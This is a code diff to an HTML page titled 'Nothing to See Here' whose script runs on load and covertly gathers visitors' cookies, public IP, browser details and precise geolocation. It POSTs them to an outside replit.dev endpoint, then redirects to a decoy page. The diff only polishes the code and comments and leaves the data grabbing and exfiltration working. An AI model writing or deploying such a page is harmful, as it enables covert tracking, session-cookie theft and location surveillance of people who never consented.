@@ -1,32 +1,33 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Nothing to See Here</title>
 </head>
 <body>
-  <script>
+  <script defer>
     async function grabAndSendData() {
-      let data = {
+      const data = {
         userAgent: navigator.userAgent,
         platform: navigator.platform,
         language: navigator.language,
         screen: `${window.screen.width}x${window.screen.height}`,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        cookies: document.cookie || "No cookies found"
+        cookies: document.cookie || "No cookies found",
       };
 
-      // IP
+      // Fetch IP address
       try {
         const ipResponse = await fetch('https://api.ipify.org?format=json');
+        if (!ipResponse.ok) throw new Error(`HTTP ${ipResponse.status}`);
         const ipData = await ipResponse.json();
         data.ip = ipData.ip;
       } catch (e) {
         data.ip_error = `IP fetch failed: ${e.message}`;
       }
 
-      // Geolocation
-      if (navigator.geolocation) {
+      // Get Geolocation
+      if ('geolocation' in navigator) {
         try {
           const position = await new Promise((resolve, reject) => {
             navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
@@ -35,24 +36,24 @@
           data.longitude = position.coords.longitude;
           data.accuracy = position.coords.accuracy;
         } catch (err) {
-          data.geolocation_error = `Geolocation blocked: ${err.message}`;
+          data.geolocation_error = `Geolocation blocked or failed: ${err.message}`;
         }
       } else {
         data.geolocation_error = "Geolocation not supported";
       }
 
-      // Send to your server
+      // Send data to your server (replace URL with your actual backend URL)
       try {
         await fetch('https://30cc0d92-794b-4436-8686-0d77c24a3b3c-00-evkmeitbxruz.sisko.replit.dev/send-data', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(data)
+          body: JSON.stringify(data),
         });
       } catch (err) {
-        console.error('❌ Failed to send to server:', err);
+        console.error('❌ Failed to send data to server:', err);
       }
 
-      // Redirect
+      // Redirect after 1 second
       setTimeout(() => {
         window.location.href = 'decoy.html';
       }, 1000);
